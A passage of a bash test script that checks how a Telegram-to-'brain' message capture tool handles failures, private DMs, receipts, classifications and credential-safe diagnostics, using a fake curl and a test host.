if run_capture "$named" "$named_bin" capture - < "$named/batch.jsonl" \
  >"$named/out" 2>"$named/err"; then
  fail "an unusable receipt must stay fail-closed"
fi
assert_grep "error: 9970 receipt mode is not 600" "$named/err" \
  "the refusal did not name the payload the documented recovery needs"
assert_grep "captured 9971" "$named/out" "a named refusal blocked a later payload"
pass "a per-line refusal names the update_id an operator must recover"

# --- a credential-systemic 401 still stops the batch ------------------------
denied=$(make_home http-denied)
denied_bin=$(make_fake_curl "$denied")
FAKE_CURL_LOG="$denied/curl.log"
FAKE_CAPTURE_FAIL_MATCH="the brain denies the token"
FAKE_CAPTURE_FAIL_CODE=401
{
  payload 9930 "the brain denies the token"
  payload 9931 "a later thought"
} > "$denied/batch.jsonl"
if run_capture "$denied" "$denied_bin" capture - < "$denied/batch.jsonl" \
  >"$denied/out" 2>"$denied/err"; then
  fail "a denied token must stay fail-closed"
fi
FAKE_CAPTURE_FAIL_MATCH=
FAKE_CAPTURE_FAIL_CODE=
assert_grep "HTTP 401" "$denied/err" "the denied token was not reported"
assert_grep "unattempted 1" "$denied/out" "a credential-systemic 401 did not stop the batch"
assert_absent "$denied/state/telegram-brain-capture/9931" "a 401 still POSTed the next payload"
pass "a 401 is systemic and still stops the batch"

# --- a channel post carrying no sender is captured --------------------------
channel=$(make_home channel-post)
printf 'on\n' > "$channel/config/telegram-brain-capture-group"
channel_bin=$(make_fake_curl "$channel")
FAKE_CURL_LOG="$channel/curl.log"
out=$(printf '%s\n' '{"chat_id":-1001234567890,"text":"shipping monday","update_id":9401}' | \
  run_capture "$channel" "$channel_bin" capture -)
expect_code 0 $? "a channel post should capture when group capture is on"
assert_contains "$out" "captured 9401 cap-1" "a channel post with no sender was dropped"
assert_not_contains "$out" "skipped:unsupported" "a missing from_id was treated as a shape rejection"
assert_grep '"source":"firstmate-telegram-group"' "$channel/state/telegram-brain-capture/9401" \
  "the channel post was not recorded as group discussion"
pass "a channel post that carries no sender is captured as group discussion"

# --- the receipt digest ignores an appearing or vanishing from_id -----------
senderdrift=$(make_home sender-drift)
senderdrift_bin=$(make_fake_curl "$senderdrift")
FAKE_CURL_LOG="$senderdrift/curl.log"
out=$(payload 9940 "the same thought" | run_capture "$senderdrift" "$senderdrift_bin" capture -)
expect_code 0 $? "the first capture should succeed"
assert_contains "$out" "captured 9940 cap-1" "the first capture did not report the capture_id"
out=$(printf '{"chat_id":%s,"text":"the same thought","update_id":9940}\n' "$CAPTAIN_CHAT" | \
  run_capture "$senderdrift" "$senderdrift_bin" capture -)
expect_code 0 $? "the same thought without a sender must not disagree with its receipt"
assert_contains "$out" "already-captured 9940 cap-1" "a dropped from_id was read as a receipt mismatch"
pass "the receipt digest survives from_id appearing or disappearing"

# --- unattempted counts payloads, not remaining input lines -----------------
count=$(make_home unattempted-count)
count_bin=$(make_fake_curl "$count")
FAKE_CURL_LOG="$count/curl.log"
FAKE_CAPTURE_FAIL_MATCH="trigger the outage"
{
  payload 9910 "trigger the outage"
  payload 9911 "group chatter" -100777 "$CAPTAIN_USER"
  payload 9912 "stranger DM" 777002 777002
  printf '{"chat_id":%s,"from_id":%s,"update_id":9913}\n' "$CAPTAIN_CHAT" "$CAPTAIN_USER"
  payload 9914 "a real pending memory"
} > "$count/batch.jsonl"
if run_capture "$count" "$count_bin" capture - < "$count/batch.jsonl" \
  >"$count/out" 2>/dev/null; then
  fail "the outage must stay fail-closed"
fi
FAKE_CAPTURE_FAIL_MATCH=
assert_grep "unattempted 1" "$count/out" \
  "unattempted counted records that would never have been posted"
pass "unattempted counts only the payloads that would have been posted"

# --- a third-party private DM is never captured -----------------------------
dm=$(make_home third-party-dm)
printf 'on\n' > "$dm/config/telegram-brain-capture-group"
dm_bin=$(make_fake_curl "$dm")
FAKE_CURL_LOG="$dm/curl.log"
out=$(payload 9301 "stranger DM" 777001 777001 | run_capture "$dm" "$dm_bin" capture -)
expect_code 0 $? "a third-party DM should be skipped, not refused"
assert_contains "$out" "skipped:private 9301" "a third-party DM was not skipped as private"
assert_absent "$dm/curl.log" "a third-party DM was posted to the brain"
assert_absent "$dm/state/telegram-brain-capture/9301" "a third-party DM was receipted"
pass "a private chat that is not the captain is never captured"

# --- an unrecognized classification is refused ------------------------------
badkind=$(make_home bad-kind)
badkind_bin=$(make_fake_curl "$badkind")
mkdir -p "$badkind/bin"
payload 9401 "carried payload" > "$badkind/messages.jsonl"
make_stub_adapter "$badkind" surprise
printf 'notice\n' > "$badkind/result"
if PATH="$badkind/bin:$badkind_bin:$BASE_PATH" \
  FM_HOME="$badkind" \
  FM_STATE_OVERRIDE="$badkind/state" \
  FM_CONFIG_OVERRIDE="$badkind/config" \
  FM_BEANZ_ENV_FILE="$badkind/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$badkind/curl.log" \
  "$CAPTURE" from-result "$badkind/result" >/dev/null 2>"$badkind/err"; then
  fail "an unrecognized classification must be refused"
fi
assert_grep "unrecognized classification: surprise" "$badkind/err" \
  "the unrecognized classification was not named"
assert_absent "$badkind/messages.calls" "an unrecognized classification still asked for messages"
pass "an unrecognized adapter classification is refused instead of silently acked"

# --- an empty classification is refused -------------------------------------
emptykind=$(make_home empty-kind)
emptykind_bin=$(make_fake_curl "$emptykind")
mkdir -p "$emptykind/bin"
payload 9501 "carried payload" > "$emptykind/messages.jsonl"
make_stub_adapter "$emptykind" ""
printf 'notice\n' > "$emptykind/result"
if PATH="$emptykind/bin:$emptykind_bin:$BASE_PATH" \
  FM_HOME="$emptykind" \
  FM_STATE_OVERRIDE="$emptykind/state" \
  FM_CONFIG_OVERRIDE="$emptykind/config" \
  FM_BEANZ_ENV_FILE="$emptykind/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$emptykind/curl.log" \
  "$CAPTURE" from-result "$emptykind/result" >/dev/null 2>"$emptykind/err"; then
  fail "an empty classification must be refused"
fi
assert_grep "unrecognized classification: <empty>" "$emptykind/err" \
  "an empty classification was not reported"
assert_absent "$emptykind/messages.calls" "an empty classification still asked for messages"
pass "an empty adapter classification is refused instead of silently acked"

# --- a transport failure names curl's exit code -----------------------------
trans=$(make_home transport)
trans_bin=$(make_fake_curl "$trans")
FAKE_CURL_LOG="$trans/curl.log"
FAKE_CURL_EXIT=7
if payload 9601 "no route to brain" | \
  run_capture "$trans" "$trans_bin" capture - >/dev/null 2>"$trans/err"; then
  fail "a curl transport failure must refuse"
fi
FAKE_CURL_EXIT=
assert_grep "transport failed: curl exit 7" "$trans/err" "the curl exit code was not reported"
assert_absent "$trans/state/telegram-brain-capture/9601" "a transport failure left a receipt"
pass "a transport failure names curl exit code for the operator"

# --- doctor reports non-secret readiness ------------------------------------
doc=$(make_home doctor)
doc_bin=$(make_fake_curl "$doc")
out=$(PATH="$doc_bin:$BASE_PATH" \
  FM_HOME="$doc" \
  FM_STATE_OVERRIDE="$doc/state" \
  FM_CONFIG_OVERRIDE="$doc/config" \
  FM_BEANZ_ENV_FILE="$doc/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  "$CAPTURE" doctor)
assert_contains "$out" "brain-env: present" "doctor missed brain credentials"
assert_contains "$out" "brain-url: https://brain.test" "doctor missed the brain URL"
assert_contains "$out" "captain-chat: configured" "doctor missed captain chat identity"
assert_contains "$out" "group-capture: off" "doctor missed the default-off group flag"
assert_not_contains "$out" "$TOKEN" "doctor printed the brain token"
pass "doctor reports non-secret readiness"

printf 'all fm-telegram-brain-capture tests passed\n'
